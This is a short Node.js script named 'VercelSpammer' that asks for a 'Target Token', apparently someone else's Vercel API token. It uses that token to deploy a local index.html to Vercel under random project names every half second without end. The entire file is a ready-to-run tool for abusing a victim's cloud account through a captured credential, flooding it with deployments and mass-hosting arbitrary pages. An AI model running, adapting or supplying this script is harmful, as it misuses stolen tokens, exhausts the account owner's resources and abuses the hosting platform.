#!/usr/bin/env node
import fs from 'fs';
import axios from 'axios';
import crypto from 'crypto';
import process from 'process';
import { spawn } from 'child_process';
import r from 'readline'
import chalk from 'chalk';
const rl = r.createInterface({
	input: process.stdin,
	output: process.stdout
});
const clear = () => {
	spawn('clear',{
		stdio:'inherit'
	});
} 

function wait(u){return new Promise(resolve=>setTimeout(resolve,u));}
async function spam(){
	clear();
	await wait(500);
	const logo = fs.readFileSync('./p','utf8');
	console.log(chalk.blue.bold(logo));
	await wait(400);
	rl.question(chalk.bold.red('Enter Target Token : '),(m)=>{
		const token = m
		const files = './index.html';
		if (!fs.existsSync(files)) {
		  console.error('[X] index.html not found');
		  spam();
		}
		
		const htmlContent = fs.readFileSync(files, 'utf8');
		function randomProjectName() {
		  return 'hoohtenan' + crypto.randomBytes(4).toString('hex');
		}
		
		async function deploy() {
		  const projectName = randomProjectName();
		  const payload = {
		    name: projectName,
		    projectSettings: {
		      framework: null,
		      buildCommand: null,
		      installCommand: null,
		      outputDirectory: null
		    },
		    files: [
		      {
		        file: 'index.html',
		        data: htmlContent
		      }
		    ]
		  };
		  try {
		    const res = await axios.post(
		      'https://api.vercel.com/v13/deployments',
		      payload,
		      {
		        headers: {
		          Authorization: `Bearer ${token}`,
		          'Content-Type': 'application/json'
		        }
		      }
		    );
		    console.log(chalk.blue.bold('[+] Deployed:', `https://${projectName}.vercel.app`));
		  } catch (err) {
		    if (err.response) {
		      console.error('[ERR]', err.response.data);
		    } else {
		      console.error('[ERR]', err.message);
		    }
		  }
		}		
		console.log(chalk.red.bold('[!] VercelSpammer Created by Nekodev.js'));
		deploy();
		setInterval(deploy, 500);
	});
} spam();
